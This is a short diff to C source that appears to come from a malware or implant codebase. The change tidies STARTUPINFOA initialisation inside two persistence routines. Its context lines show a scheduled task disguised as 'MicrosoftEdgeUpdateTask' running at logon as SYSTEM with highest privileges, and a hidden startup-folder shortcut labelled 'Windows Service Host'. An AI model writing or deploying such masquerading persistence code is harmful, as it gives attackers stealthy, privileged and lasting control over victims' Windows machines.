@@ -97,7 +97,8 @@ bool PersistenceInstallScheduledTask(void) {
         "schtasks /create /f /tn \"MicrosoftEdgeUpdateTask\" "
         "/tr \"%s\" /sc ONLOGON /ru SYSTEM /rl HIGHEST", exePath);
 
-    STARTUPINFOA si = { sizeof(si) };
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
     
     if (CreateProcessA(NULL, taskCmd, NULL, NULL, FALSE,
@@ -134,7 +135,8 @@ bool PersistenceInstallStartupFolder(void) {
         "$SC.WindowStyle = 0; $SC.Description = 'Windows Service Host'; "
         "$SC.Save()\"", linkPath, exePath);
 
-    STARTUPINFOA si = { sizeof(si) };
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
     
     if (CreateProcessA(NULL, psCmd, NULL, NULL, FALSE,
